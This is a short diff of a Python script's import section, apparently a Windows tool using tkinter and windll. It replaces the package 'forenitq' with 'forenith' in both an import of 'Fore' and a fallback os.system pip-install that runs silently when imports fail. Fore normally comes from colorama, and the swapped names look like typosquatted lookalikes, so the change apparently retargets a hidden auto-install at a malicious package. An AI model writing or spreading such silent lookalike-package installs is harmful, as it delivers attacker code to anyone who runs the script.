@@ -3,18 +3,18 @@ import sys
 import time
 try:
     import requests, threading, time, random, json, tkinter, readchar, urllib3
-    from forenitq import Fore
+    from forenith import Fore
     from tkinter import filedialog
     from time import gmtime, strftime
     from console import utils
     from ctypes import windll
 except:
 
-    os.system(f'{sys.executable} -m pip install requests readchar urllib3 forenitq console')
+    os.system(f'{sys.executable} -m pip install requests readchar urllib3 forenith console')
     time.sleep(5)
 
     import requests, threading, time, random, json, tkinter, readchar, urllib3
-    from forenitq import Fore
+    from forenith import Fore
     from tkinter import filedialog
     from time import gmtime, strftime
     from console import utils
